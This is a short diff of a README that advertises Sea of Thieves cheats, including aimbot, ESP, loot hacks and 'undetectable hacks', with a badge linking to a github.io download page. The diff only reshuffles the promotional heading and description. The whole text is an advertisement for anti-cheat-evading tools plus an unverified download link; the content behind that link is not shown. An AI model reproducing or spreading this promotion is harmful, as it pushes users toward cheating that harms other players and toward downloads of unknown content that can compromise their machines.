@@ -1,7 +1,4 @@
-# 🌊 Sea of Thieves Ultimate Cheats: Aimbot, ESP & Loot Hacks  
-
-## Extended Description  
-Transform your Sea of Thieves journey with cutting-edge **cheats designed for victory**! Whether you’re hunting treasure, battling pirates, or mastering cannon warfare, our tools give you the edge. Enjoy seamless integration and **undetectable hacks** to outplay rivals and maximize loot.  
+# Transform your Sea of Thieves journey with cutting-edge **cheats designed for victory**! Whether you’re hunting treasure, battling pirates, or mastering cannon warfare, our tools give you the edge. Enjoy seamless integration and **undetectable hacks** to outplay rivals and maximize loot.  
 
 ## 🔗 Download Link  
 [![Download Cheats](https://img.shields.io/badge/Download-Cheats-blueviolet)](https://seaofthieves-cheat.github.io/.github/)  
